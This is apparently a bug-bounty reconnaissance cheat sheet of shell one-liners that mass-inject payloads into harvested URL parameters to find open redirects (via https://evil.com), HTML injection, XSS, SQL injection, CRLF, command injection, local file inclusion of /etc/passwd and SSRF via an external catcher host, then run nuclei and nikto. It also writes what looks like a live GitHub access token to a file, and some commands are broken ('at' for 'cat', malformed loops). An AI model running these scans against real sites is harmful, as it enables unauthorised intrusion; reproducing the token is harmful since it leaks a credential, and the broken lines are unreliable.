#Open Redirect : 
cat $url/recon/final_params.txt | qsreplace 'https://evil.com' | while read host do ; do curl -s -L $host -I | grep "https://evil.com" && echo "$host" ;done >> $url/open_redirect.txt
#HTML Injection :
cat $url/recon/final_params.txt | qsreplace '"><u>hyper</u>' | tee $url/recon/temp.txt && cat $url/recon/temp.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<u>hyper</u>" && echo "$host"; done > $url/htmli.txt
#XSS :
dalfox file $url/htmli.txt -o  $url/rxss.txt
#Sql Injection :
cat $url/htmli.txt | python3 /opt/sqlmap/sqlmap.py --level 2 --risk 2
#CRLF Injection :
crlfuzz -l $url/recon/final_params.txt -o $url/crlf-vuln.txt -s 
#Command Injection :
python3 /opt/commix/commix.py -m $url/recon/final_params.txt --batch 
#Template Injection : 

#XXE Injection : 

#Local File Inclusion : 
cat params.txt | qsreplace FUZZ | while read url ; do ffuf -u $url -v -mr "root:x" -w /root/lfi-payloads.txt; done > lfi.txt
#Parameter Pollution : 

#External SSRF : 
at $url/recon/final_params.txt | qsreplace "https://noor.requestcatcher.com/test" | tee $url/recon/ssrftest.txt && cat $url/recon/ssrftest.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "request caught" && echo "$host \033[0;31mVulnearble\n"; done >> $url/params_vuln/eSSRF.txt
#--------------------------------------------------------
SubDomains
#nuclei 
cat $1/subs.txt | nuclei > nuclei.txt
#nikto
nikto -h $1/subs.txt > nikto.txt
#GitHub Recon
https://github.com/obheda12/GitDorker
echo "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" > /opt/github-token.txt

